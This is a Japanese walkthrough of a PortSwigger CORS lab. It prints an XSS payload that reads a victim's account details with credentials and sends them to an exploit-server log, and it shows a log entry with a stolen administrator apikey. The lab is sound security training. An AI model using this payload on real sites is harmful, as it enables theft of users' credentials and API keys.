# 信頼できる安全でないプロトコルによる CORS の脆弱性

次のハッキングラボを実施  
https://portswigger.net/web-security/cors/lab-breaking-https-attack  
この Web サイトは、プロトコルに関係なくすべてのサブドメインを信頼するという点で、 安全でない CORS 構成を採用しています。

- 1. BurpSuite を起動して Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 一般ユーザーでログインします
- 4. GET /accountDetails HTTP/2 リクエストを send to repeater します
- 5. リクエストに origin ヘッダーを付けて送信します

```
GET /accountDetails HTTP/2
Host: 0a4f002b0342cd358017949000df00bd.web-security-academy.net
Cookie: session=v0AFgBWStP9KUbCbWr1YQSD1TeOcbGzu
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a4f002b0342cd358017949000df00bd.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Orign: http://subdomain.web-security-academy.net
```

レスポンス。

```
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
```

- 6. 商品ページに移動し、在庫チェックボタン押下
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/26268579-a42b-4a3f-a01f-82f6dcedbc38)

- 7. エクスプロイトサーバに移動します
- 8. Body に次の内容を入力します

```html
<script>
  document.location =
    "http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1";
</script>
```

- 9. Store ボタン押下後に deliver exploit to victim ボタン押下
- 10. Access log を見ると他者の apikey が盗めます

```
10.0.3.205      2023-08-25 23:16:29 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22IPyUGVy9xTltyYJbM80H0tntWGDUlU6J%22,%20%20%22sessions%22:%20[%20%20%20%20%220XQJoHWHLnVRn1fjCWhT8xvkMvlqvSdv%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
```

- 11. apikey をサブミットしてラボを解決します
